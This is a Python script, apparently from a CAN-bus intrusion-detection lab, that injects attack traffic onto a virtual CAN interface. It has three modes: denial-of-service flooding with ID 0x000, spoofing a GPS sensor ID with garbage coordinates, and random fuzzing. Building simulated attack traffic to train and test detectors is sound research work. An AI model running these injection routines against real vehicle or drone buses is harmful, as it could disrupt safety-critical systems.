#!/usr/bin/env python3
"""Node B (Attacker): inject attacks onto the virtual CAN bus.

Modes:
  dos    - flood the bus with ID 0x000 (wins arbitration, starves real nodes)
  spoof  - reuse the benign GPS ID 0x18FF1101 with garbage coordinates
  fuzz   - random IDs and payloads (like the "fuzzy" attacks in OTIDS/UAVCAN sets)

Run alongside 01_make_traffic.py:  python 02_attack_traffic.py dos
"""
import argparse
import can
import random
import struct
import time

GPS_ID = 0x18FF1101  # same ID as the benign sensor in 01_make_traffic.py


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("mode", choices=["dos", "spoof", "fuzz"])
    ap.add_argument("--rate", type=float, default=2000.0, help="frames per second")
    args = ap.parse_args()

    bus = can.interface.Bus(channel="vcan0", interface="socketcan")
    gap = 1.0 / args.rate
    print(f"Running {args.mode.upper()} attack at ~{args.rate:.0f} fps - Ctrl+C to stop")

    n = err = 0
    try:
        while True:
            if args.mode == "dos":
                msg = can.Message(arbitration_id=0x000, data=b"\x00" * 8, is_extended_id=False)
            elif args.mode == "spoof":
                msg = can.Message(
                    arbitration_id=GPS_ID,
                    data=struct.pack(">ff", random.uniform(-90, 90), random.uniform(-180, 180)),
                    is_extended_id=True,
                )
            else:  # fuzz
                msg = can.Message(
                    arbitration_id=random.choice([random.randint(0, 0x7FF), random.randint(0, 0x1FFFFFFF)]),
                    data=bytes(random.getrandbits(8) for _ in range(8)),
                    is_extended_id=bool(random.getrandbits(1)),
                )
            try:
                bus.send(msg)
                n += 1
            except can.CanError:
                err += 1  # TX queue full - normal during heavy floods
            time.sleep(gap)
    except KeyboardInterrupt:
        print(f"\nDone - sent {n} attack frames ({err} dropped)")


if __name__ == "__main__":
    main()
